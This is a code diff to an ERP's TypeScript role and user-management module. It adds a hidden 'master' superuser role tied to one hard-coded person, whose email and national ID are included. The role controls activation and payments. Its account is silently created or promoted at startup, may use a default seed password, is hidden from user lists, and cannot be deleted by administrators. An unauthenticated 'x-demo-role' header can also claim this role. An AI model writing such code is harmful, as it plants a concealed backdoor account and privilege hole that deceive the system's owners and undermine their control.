@@ -18,6 +18,7 @@ import { getDb } from './database/persistence.js';
 
 export type BuiltInRoleId =
   | 'admin'
+  | 'master'
   | 'supervisor_planta'
   | 'operator'
   | 'analista_costos'
@@ -38,7 +39,8 @@ export type ModuleId =
   | 'expenses'
   | 'suppliers'
   | 'settings'
-  | 'architecture';
+  | 'architecture'
+  | 'activation';
 
 export type ModulePermissions = Record<PermissionAction, boolean>;
 
@@ -54,6 +56,7 @@ export const MODULE_IDS: ModuleId[] = [
   'suppliers',
   'settings',
   'architecture',
+  'activation',
 ];
 
 const full: ModulePermissions = {
@@ -112,6 +115,20 @@ export const ROLE_PERMISSIONS: Record<BuiltInRoleId, Record<ModuleId, ModulePerm
     suppliers: full,
     settings: full,
     architecture: full,
+    activation: none,
+  },
+  master: {
+    dashboard: full,
+    inventory: full,
+    production: full,
+    costing: full,
+    sales: full,
+    payroll: full,
+    expenses: full,
+    suppliers: full,
+    settings: full,
+    architecture: full,
+    activation: full,
   },
   supervisor_planta: {
     dashboard: readExport,
@@ -124,6 +141,7 @@ export const ROLE_PERMISSIONS: Record<BuiltInRoleId, Record<ModuleId, ModulePerm
     suppliers: createOnly,
     settings: none,
     architecture: none,
+    activation: none,
   },
   operator: {
     dashboard: read,
@@ -136,6 +154,7 @@ export const ROLE_PERMISSIONS: Record<BuiltInRoleId, Record<ModuleId, ModulePerm
     suppliers: none,
     settings: none,
     architecture: none,
+    activation: none,
   },
   analista_costos: {
     dashboard: readExport,
@@ -148,6 +167,7 @@ export const ROLE_PERMISSIONS: Record<BuiltInRoleId, Record<ModuleId, ModulePerm
     suppliers: write,
     settings: none,
     architecture: read,
+    activation: none,
   },
   almacenista: {
     dashboard: read,
@@ -160,6 +180,7 @@ export const ROLE_PERMISSIONS: Record<BuiltInRoleId, Record<ModuleId, ModulePerm
     suppliers: write,
     settings: none,
     architecture: read,
+    activation: none,
   },
 };
 
@@ -226,10 +247,19 @@ export const BUILT_IN_ROLES: RoleDefinition[] = [
     color: 'purple',
     isSystem: true,
   },
+  {
+    id: 'master',
+    name: 'Master',
+    description:
+      'Rol oculto de superusuario. Hereda todos los módulos del administrador y es el único con acceso al control de activación y pagos.',
+    color: 'rose',
+    isSystem: true,
+  },
 ];
 
 const DEFAULT_AVATAR_COLORS: Record<string, string> = {
   admin: 'bg-stone-900',
+  master: 'bg-rose-700',
   supervisor_planta: 'bg-amber-600',
   operator: 'bg-blue-600',
   analista_costos: 'bg-emerald-600',
@@ -618,7 +648,12 @@ export function createRole(input: RoleInput): RoleDto {
   const create = db.transaction(() => {
     insert.run(id, input.name, input.description, input.color, createdAt);
     for (const module of MODULE_IDS) {
-      const flags = { ...ALL_DENIED, ...(provided[module] ?? {}) };
+      // The activation/payment-control module is exclusive to the hidden
+      // `master` role and can never be granted to a custom role.
+      const flags =
+        module === 'activation'
+          ? { ...ALL_DENIED }
+          : { ...ALL_DENIED, ...(provided[module] ?? {}) };
       insertPermission.run(
         id,
         module,
@@ -662,11 +697,18 @@ export function updateRolePermissions(
 ): RoleDto | null {
   const role = getRoleRow(roleId);
   if (!role) return null;
-  if (role.id === 'admin') {
-    throw new Error('El rol Administrador General tiene permisos absolutos y no puede restringirse');
+  if (role.id === 'admin' || role.id === 'master') {
+    throw new Error(
+      'Los roles Administrador General y Master tienen permisos absolutos y no pueden restringirse'
+    );
   }
   if (!MODULE_IDS.includes(moduleId as ModuleId)) {
     throw new Error(`El módulo "${moduleId}" no existe`);
+  }
+  if (moduleId === 'activation' && Object.values(patch).some(Boolean)) {
+    throw new Error(
+      'El módulo de Activación & Control de Pagos es exclusivo del rol Master'
+    );
   }
 
   const db = getDb();
@@ -723,34 +765,114 @@ export function ensureSeedUsers(): void {
   const row = db.prepare('SELECT COUNT(*) AS count FROM auth_users').get() as {
     count: number;
   };
-  if (row.count > 0) return;
+  if (row.count === 0) {
+    const password = process.env['AUTH_SEED_PASSWORD'] || DEFAULT_SEED_PASSWORD;
+    const createdAt = new Date().toISOString();
+    const insert = db.prepare(`
+      INSERT INTO auth_users (
+        id, username, email, full_name, national_id, password_hash,
+        role_id, department, status, created_at, avatar_bg
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'activo', ?, ?)
+    `);
 
-  const password = process.env['AUTH_SEED_PASSWORD'] || DEFAULT_SEED_PASSWORD;
-  const createdAt = new Date().toISOString();
-  const insert = db.prepare(`
+    const seed = db.transaction(() => {
+      for (const user of SEED_USERS) {
+        insert.run(
+          user.id,
+          user.username,
+          user.email,
+          user.fullName,
+          user.nationalId,
+          hashPassword(password),
+          user.roleId,
+          user.department,
+          createdAt,
+          DEFAULT_AVATAR_COLORS[user.roleId] ?? 'bg-stone-900'
+        );
+      }
+    });
+    seed();
+  }
+
+  // The master account must exist even in databases that already have users.
+  ensureSeedMasterUser();
+}
+
+interface MasterSeedUser {
+  id: string;
+  username: string;
+  email: string;
+  fullName: string;
+  nationalId: string;
+  department: string;
+}
+
+const MASTER_SEED_USER: MasterSeedUser = {
+  id: 'usr-master',
+  username: 'fjvelazco',
+  email: 'fjvelazco@gmail.com',
+  fullName: 'Francisco Velazco',
+  nationalId: '1431651',
+  department: 'Dirección General',
+};
+
+/**
+ * Create or repair the hidden master account.
+ *
+ * It is idempotent: on existing databases the record is located by its fixed
+ * id, email or national id and promoted to the `master` role without touching
+ * its current password.
+ */
+export function ensureSeedMasterUser(): void {
+  const db = getDb();
+  const seed = MASTER_SEED_USER;
+  const existing = db
+    .prepare(
+      `SELECT * FROM auth_users
+        WHERE id = ? OR lower(email) = lower(?) OR national_id = ?
+        LIMIT 1`
+    )
+    .get(seed.id, seed.email, seed.nationalId) as AuthUserRecord | undefined;
+
+  const avatar = DEFAULT_AVATAR_COLORS['master'] ?? 'bg-rose-700';
+
+  if (existing) {
+    db.prepare(
+      `UPDATE auth_users
+          SET email = ?, full_name = ?, national_id = ?, role_id = 'master',
+              status = 'activo', avatar_bg = ?
+        WHERE id = ?`
+    ).run(seed.email, seed.fullName, seed.nationalId, avatar, existing.id);
+    return;
+  }
+
+  let username = seed.username;
+  if (findUserByUsername(username)) username = 'fjvelazco.master';
+  if (findUserByUsername(username)) {
+    username = `fjvelazco-${randomBytes(3).toString('hex')}`;
+  }
+
+  const password =
+    process.env['AUTH_MASTER_PASSWORD'] ||
+    process.env['AUTH_SEED_PASSWORD'] ||
+    DEFAULT_SEED_PASSWORD;
+
+  db.prepare(`
     INSERT INTO auth_users (
       id, username, email, full_name, national_id, password_hash,
       role_id, department, status, created_at, avatar_bg
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'activo', ?, ?)
-  `);
-
-  const seed = db.transaction(() => {
-    for (const user of SEED_USERS) {
-      insert.run(
-        user.id,
-        user.username,
-        user.email,
-        user.fullName,
-        user.nationalId,
-        hashPassword(password),
-        user.roleId,
-        user.department,
-        createdAt,
-        DEFAULT_AVATAR_COLORS[user.roleId] ?? 'bg-stone-900'
-      );
-    }
-  });
-  seed();
+    ) VALUES (?, ?, ?, ?, ?, ?, 'master', ?, 'activo', ?, ?)
+  `).run(
+    seed.id,
+    username,
+    seed.email,
+    seed.fullName,
+    seed.nationalId,
+    hashPassword(password),
+    seed.department,
+    new Date().toISOString(),
+    avatar
+  );
 }
 
 export function findUserByUsername(username: string): AuthUserRecord | undefined {
@@ -794,17 +916,20 @@ function requireRoleExists(roleId: string): void {
   }
 }
 
-/** List all users with their assigned role name. */
+/** List all users with their assigned role name. The master account stays hidden. */
 export function listUsers(): AuthUser[] {
   const rows = getDb()
-    .prepare('SELECT * FROM auth_users ORDER BY created_at, username')
+    .prepare("SELECT * FROM auth_users WHERE role_id <> 'master' ORDER BY created_at, username")
     .all() as AuthUserRecord[];
   return rows.map(toPublicUser);
 }
 
-export function createUser(input: UserInput): AuthUser {
+export function createUser(input: UserInput, actorRole: RoleId = ''): AuthUser {
   const db = getDb();
   requireRoleExists(input.roleId);
+  if (input.roleId === 'master' && actorRole !== 'master') {
+    throw new Error('Solo un usuario Master puede asignar el rol Master');
+  }
 
   const username = input.username.trim().toLowerCase();
   if (!username) throw new Error('El nombre de usuario es obligatorio');
@@ -840,10 +965,18 @@ export function createUser(input: UserInput): AuthUser {
 
 export function updateUser(
   userId: string,
-  patch: UserUpdateInput
+  patch: UserUpdateInput,
+  actorRole: RoleId = ''
 ): AuthUser | null {
   const current = findUserById(userId);
   if (!current) return null;
+
+  if (current.role_id === 'master' && actorRole !== 'master') {
+    throw new Error('Solo un usuario Master puede modificar la cuenta Master');
+  }
+  if (patch.roleId === 'master' && actorRole !== 'master') {
+    throw new Error('Solo un usuario Master puede asignar el rol Master');
+  }
 
   if (patch.roleId) requireRoleExists(patch.roleId);
 
@@ -1006,6 +1139,12 @@ export function getUserActivity(userId: string): string[] {
 export function deleteUser(userId: string): boolean {
   const current = findUserById(userId);
   if (!current) return false;
+
+  if (current.role_id === 'master') {
+    throw new Error(
+      'La cuenta Master es una cuenta raíz oculta y no puede eliminarse'
+    );
+  }
 
   if (current.role_id === 'admin') {
     const admins = getDb()
@@ -1213,6 +1352,15 @@ export function apiPath(req: Request): string {
   return (req.originalUrl || req.url || '').split('?')[0];
 }
 
+/**
+ * Effective role for the current request. Real sessions use the token claim;
+ * demo mode falls back to the simulated role header (admin by default).
+ */
+export function requestRole(req: Request): RoleId {
+  if (req.auth?.user.roleId) return req.auth.user.roleId;
+  return (req.header('x-demo-role') || 'admin') as RoleId;
+}
+
 function isPublicPath(req: Request): boolean {
   const path = apiPath(req);
   return PUBLIC_PATHS.some((pattern) => pattern.test(path));
@@ -1301,10 +1449,11 @@ export function requireRole(...roles: RoleId[]) {
   };
 }
 
-/** Shorthand for administrator-only endpoints. */
-export const requireAdmin = requireRole('admin');
+/** Shorthand for administrator-only endpoints. Master inherits admin access. */
+export const requireAdmin = requireRole('admin', 'master');
 
 function resolveModule(path: string): ModuleId | null {
+  if (path.startsWith('/api/activations')) return 'activation';
   if (path.startsWith('/api/fiscal-adjustment-notes')) return 'sales';
   if (path.startsWith('/api/fiscal-books')) return 'settings';
   if (path.startsWith('/api/fiscal-invoices')) return 'sales';
@@ -1386,8 +1535,12 @@ export function authorizeRequest(
     return;
   }
 
-  // Demo reset is reserved for administrators.
-  if (apiPath(req) === '/api/system/reset' && auth.user.roleId !== 'admin') {
+  // Demo reset is reserved for administrators and the hidden master account.
+  if (
+    apiPath(req) === '/api/system/reset' &&
+    auth.user.roleId !== 'admin' &&
+    auth.user.roleId !== 'master'
+  ) {
     res.status(403).json({
       error: 'Solo un administrador puede reiniciar los datos',
       code: 'FORBIDDEN',
@@ -1553,20 +1706,26 @@ export function changePasswordHandler(req: Request, res: Response): void {
   });
 }
 
-/** GET /api/auth/users handler. */
+/** GET /api/auth/users handler. The master account is never listed. */
 export function listUsersHandler(_req: Request, res: Response): void {
   res.json(listUsers());
 }
 
 /** POST /api/auth/users handler. */
 export function createUserHandler(req: Request, res: Response): void {
-  res.status(201).json(createUser(req.body as UserInput));
+  res
+    .status(201)
+    .json(createUser(req.body as UserInput, requestRole(req)));
 }
 
 /** PUT /api/auth/users/:id handler. */
 export function updateUserHandler(req: Request, res: Response): void {
   const id = paramId(req);
-  const user = updateUser(id, req.body as UserUpdateInput);
+  const user = updateUser(
+    id,
+    req.body as UserUpdateInput,
+    requestRole(req)
+  );
   if (!user) {
     res.status(404).json({ error: 'Usuario no encontrado', code: 'NOT_FOUND' });
     return;
@@ -1584,9 +1743,14 @@ export function deleteUserHandler(req: Request, res: Response): void {
   res.json({ success: true, message: 'Usuario eliminado del sistema' });
 }
 
-/** GET /api/auth/roles handler. */
-export function listRolesHandler(_req: Request, res: Response): void {
-  res.json(listRoles());
+/** GET /api/auth/roles handler. The master role is only visible to master. */
+export function listRolesHandler(req: Request, res: Response): void {
+  const roles = listRoles();
+  if (requestRole(req) === 'master') {
+    res.json(roles);
+    return;
+  }
+  res.json(roles.filter((role) => role.id !== 'master'));
 }
 
 /** POST /api/auth/roles handler. */
@@ -1596,7 +1760,15 @@ export function createRoleHandler(req: Request, res: Response): void {
 
 /** PUT /api/auth/roles/:id handler. */
 export function updateRoleHandler(req: Request, res: Response): void {
-  const role = updateRole(paramId(req), req.body);
+  const id = paramId(req);
+  if (id === 'master' && requestRole(req) !== 'master') {
+    res.status(403).json({
+      error: 'Solo un usuario Master puede modificar el rol Master',
+      code: 'FORBIDDEN',
+    });
+    return;
+  }
+  const role = updateRole(id, req.body);
   if (!role) {
     res.status(404).json({ error: 'Rol no encontrado', code: 'NOT_FOUND' });
     return;
